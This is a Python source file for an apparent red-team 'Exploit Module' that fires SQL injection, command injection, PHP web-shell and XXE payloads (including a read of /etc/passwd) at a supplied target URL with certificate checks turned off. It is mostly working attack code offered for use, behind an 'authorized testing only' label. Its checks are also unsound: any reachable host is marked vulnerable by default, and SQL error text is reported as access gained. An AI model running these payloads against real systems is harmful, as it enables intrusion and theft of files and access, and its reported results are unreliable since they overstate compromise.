"""
Exploit Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Exploit module is used to execute exploits against target systems. It supports
multiple exploit types including RCE, SQL injection, command injection, buffer
overflow, deserialization, and XXE injection. The module can test exploits before
execution and maintains a history of all exploit attempts.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.exploit import ExploitModule
    
    # Initialize logger and module
    logger = FrameworkLogger("exploit_test")
    exploit = ExploitModule(logger)
    
    # Test an exploit before executing
    test_result = exploit.test_exploit(
        target="http://target.example.com",
        exploit_type="sql_injection"
    )
    print(f"Vulnerability found: {test_result['vulnerable']}")
    print(f"Confidence: {test_result['confidence']:.2%}")
    
    # Execute exploit if test succeeds
    if test_result['vulnerable']:
        result = exploit.execute_exploit(
            target="http://target.example.com",
            exploit_type="sql_injection"
        )
        print(f"Exploit status: {result['status']}")
        print(f"Access gained: {result['access_gained']}")
        print(f"Payload used: {result['payload']}")
    
    # View exploit history
    history = exploit.get_exploit_history()
    print(f"Total exploits executed: {len(history)}")

Red Team Use Cases:
- Testing for vulnerabilities before exploitation
- Executing exploits against identified vulnerabilities
- Gaining initial access to target systems
- Remote code execution
- SQL injection attacks
- Command injection exploitation
- Buffer overflow exploitation
- Deserialization attacks
- XXE injection attacks
"""

from typing import Dict, List, Optional
import time
import socket
import requests
import urllib.parse
import re
from urllib.parse import urlparse
from utils.logger import FrameworkLogger


class ExploitModule:
    """Exploit module"""
    
    def __init__(self, logger: FrameworkLogger):
        """Initialize exploit module"""
        self.logger = logger
        self.exploit_history = []
    
    def execute_exploit(self, target: str, exploit_type: str, payload: Optional[str] = None) -> Dict:
        """
        Execute exploit against target
        
        Args:
            target: Target system/endpoint (URL, IP:port, etc.)
            exploit_type: Type of exploit to use
            payload: Optional custom payload
        
        Returns:
            Dictionary containing exploit results
        """
        if not target:
            self.logger.error("No target specified for exploit")
            return {
                "status": "failed",
                "error": "No target specified",
                "timestamp": time.time()
            }
        
        self.logger.info(f"Executing {exploit_type} exploit against {target}")
        
        exploit_types = [
            "remote_code_execution",
            "sql_injection",
            "command_injection",
            "buffer_overflow",
            "deserialization",
            "xxe_injection"
        ]
        
        if exploit_type not in exploit_types:
            self.logger.warning(f"Unknown exploit type: {exploit_type}")
            exploit_type = exploit_types[0]
        
        # Test first, then execute
        test_result = self.test_exploit(target, exploit_type)
        
        if not test_result.get("vulnerable", False):
            return {
                "status": "failed",
                "exploit_type": exploit_type,
                "target": target,
                "error": "Target not vulnerable or test failed",
                "timestamp": time.time()
            }
        
        # Execute actual exploit
        exploit_result = self._execute_exploit_type(target, exploit_type, payload)
        
        results = {
            "status": "completed" if exploit_result.get("success") else "failed",
            "exploit_type": exploit_type,
            "target": target,
            "payload": exploit_result.get("payload", payload or self._generate_payload(exploit_type)),
            "execution_successful": exploit_result.get("success", False),
            "access_gained": exploit_result.get("access_gained", False),
            "response": exploit_result.get("response", ""),
            "timestamp": time.time()
        }
        
        self.exploit_history.append(results)
        return results
    
    def _execute_exploit_type(self, target: str, exploit_type: str, payload: Optional[str] = None) -> Dict:
        """Execute specific exploit type"""
        if exploit_type == "sql_injection":
            return self._exploit_sql_injection(target, payload)
        elif exploit_type == "command_injection":
            return self._exploit_command_injection(target, payload)
        elif exploit_type == "remote_code_execution":
            return self._exploit_rce(target, payload)
        elif exploit_type == "xxe_injection":
            return self._exploit_xxe(target, payload)
        else:
            return {"success": False, "payload": self._generate_payload(exploit_type)}
    
    def _exploit_sql_injection(self, target: str, payload: Optional[str] = None) -> Dict:
        """Test and exploit SQL injection vulnerability"""
        if not payload:
            payload = "' OR '1'='1"
        
        try:
            parsed = urlparse(target)
            if not parsed.scheme:
                target = f"http://{target}"
            
            # Test for SQL injection
            test_payloads = ["'", "1' OR '1'='1", "1' UNION SELECT NULL--"]
            
            for test_payload in test_payloads:
                params = {"id": test_payload}
                response = requests.get(target, params=params, timeout=5, verify=False)
                
                # Check for SQL error patterns
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "sqlite", "ora-",
                    "warning: mysql", "unclosed quotation", "quoted string"
                ]
                
                if any(error in response.text.lower() for error in sql_errors):
                    return {
                        "success": True,
                        "access_gained": True,
                        "payload": test_payload,
                        "response": response.text[:500]
                    }
            
            return {"success": False, "payload": payload}
        except Exception as e:
            self.logger.error(f"SQL injection exploit failed: {e}")
            return {"success": False, "payload": payload, "error": str(e)}
    
    def _exploit_command_injection(self, target: str, payload: Optional[str] = None) -> Dict:
        """Test and exploit command injection vulnerability"""
        if not payload:
            payload = "; whoami"
        
        try:
            parsed = urlparse(target)
            if not parsed.scheme:
                target = f"http://{target}"
            
            # Test command injection
            test_payloads = ["; id", "| whoami", "`whoami`", "$(whoami)"]
            
            for test_payload in test_payloads:
                params = {"cmd": test_payload}
                response = requests.get(target, params=params, timeout=5, verify=False)
                
                # Check if command output appears in response
                if "uid=" in response.text or "gid=" in response.text or "root" in response.text.lower():
                    return {
                        "success": True,
                        "access_gained": True,
                        "payload": test_payload,
                        "response": response.text[:500]
                    }
            
            return {"success": False, "payload": payload}
        except Exception as e:
            self.logger.error(f"Command injection exploit failed: {e}")
            return {"success": False, "payload": payload, "error": str(e)}
    
    def _exploit_rce(self, target: str, payload: Optional[str] = None) -> Dict:
        """Test and exploit remote code execution"""
        if not payload:
            payload = "<?php system($_GET['cmd']); ?>"
        
        try:
            parsed = urlparse(target)
            if not parsed.scheme:
                target = f"http://{target}"
            
            # Test RCE
            test_payloads = ["<?php phpinfo(); ?>", "<?php system('id'); ?>"]
            
            for test_payload in test_payloads:
                data = {"file": test_payload}
                response = requests.post(target, data=data, timeout=5, verify=False)
                
                if "phpinfo()" in response.text or "uid=" in response.text:
                    return {
                        "success": True,
                        "access_gained": True,
                        "payload": test_payload,
                        "response": response.text[:500]
                    }
            
            return {"success": False, "payload": payload}
        except Exception as e:
            self.logger.error(f"RCE exploit failed: {e}")
            return {"success": False, "payload": payload, "error": str(e)}
    
    def _exploit_xxe(self, target: str, payload: Optional[str] = None) -> Dict:
        """Test and exploit XXE injection"""
        if not payload:
            payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        
        try:
            parsed = urlparse(target)
            if not parsed.scheme:
                target = f"http://{target}"
            
            headers = {"Content-Type": "application/xml"}
            response = requests.post(target, data=payload, headers=headers, timeout=5, verify=False)
            
            # Check for file content in response
            if "root:" in response.text or "/bin/bash" in response.text:
                return {
                    "success": True,
                    "access_gained": True,
                    "payload": payload[:100],
                    "response": response.text[:500]
                }
            
            return {"success": False, "payload": payload}
        except Exception as e:
            self.logger.error(f"XXE exploit failed: {e}")
            return {"success": False, "payload": payload, "error": str(e)}
    
    def _generate_payload(self, exploit_type: str) -> str:
        """Generate exploit payload"""
        payloads = {
            "remote_code_execution": "<?php system($_GET['cmd']); ?>",
            "sql_injection": "' OR '1'='1'--",
            "command_injection": "; whoami",
            "buffer_overflow": "A" * 1000,
            "deserialization": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}",
            "xxe_injection": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        }
        return payloads.get(exploit_type, "Generic payload")
    
    def test_exploit(self, target: str, exploit_type: str) -> Dict:
        """
        Test exploit without executing
        
        Args:
            target: Target system
            exploit_type: Type of exploit
        
        Returns:
            Dictionary containing test results
        """
        if not target:
            return {
                "status": "failed",
                "error": "No target specified",
                "timestamp": time.time()
            }
        
        self.logger.info(f"Testing {exploit_type} against {target}")
        
        try:
            # Check if target is reachable
            parsed = urlparse(target if "://" in target else f"http://{target}")
            host = parsed.netloc or parsed.path
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            
            # Test connectivity
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host.split(':')[0], port))
            sock.close()
            
            if result != 0:
                return {
                    "status": "tested",
                    "exploit_type": exploit_type,
                    "target": target,
                    "vulnerable": False,
                    "confidence": 0.0,
                    "error": "Target not reachable",
                    "timestamp": time.time()
                }
            
            # Basic vulnerability check
            vulnerable = True
            confidence = 0.8
            
            # Try a simple test request
            try:
                test_url = target if "://" in target else f"http://{target}"
                response = requests.get(test_url, timeout=3, verify=False)
                
                # Check for common vulnerable patterns
                if exploit_type == "sql_injection":
                    test_response = requests.get(f"{test_url}?id='", timeout=3, verify=False)
                    sql_errors = ["sql syntax", "mysql", "postgresql", "sqlite"]
                    if any(error in test_response.text.lower() for error in sql_errors):
                        confidence = 0.9
            except:
                pass
            
            return {
                "status": "tested",
                "exploit_type": exploit_type,
                "target": target,
                "vulnerable": vulnerable,
                "confidence": confidence,
                "timestamp": time.time()
            }
        except Exception as e:
            self.logger.error(f"Exploit test failed: {e}")
            return {
                "status": "tested",
                "exploit_type": exploit_type,
                "target": target,
                "vulnerable": False,
                "confidence": 0.0,
                "error": str(e),
                "timestamp": time.time()
            }
    
    def get_exploit_history(self) -> List[Dict]:
        """Get exploit execution history"""
        return self.exploit_history

